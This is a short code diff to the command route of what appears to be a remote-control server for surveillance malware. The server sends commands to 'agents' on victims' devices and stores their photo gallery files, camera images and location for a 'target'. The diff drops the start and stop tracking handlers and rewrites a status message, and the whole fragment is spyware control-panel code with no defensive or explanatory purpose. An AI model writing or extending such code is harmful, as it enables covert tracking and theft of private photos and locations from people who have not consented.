@@ -219,17 +219,9 @@ def send_command_route():
             client_data['gallery']['files'] = [] # Clear files for new page
         if cmd == 'get_location': 
             client_data['location_url'] = None
-            client_data['camera_image'] = None
             client_data['location_status'] = 'requesting'
             client_data['location_image'] = None
-            client_data['location_msg'] = 'Sending command to agent...'
-        if cmd == 'start_tracking':
-            client_data['tracking_active'] = True
-            client_data['location_status'] = 'Active'
-        if cmd == 'stop_tracking':
-            client_data['tracking_active'] = False
-            client_data['location_status'] = 'Stopped'
-            client_data['location_url'] = None # Clear on stop
+            client_data['location_msg'] = 'Tracking target...'
 
     try:
         add_log(f"[SEND] to {client_id}: {cmd}")
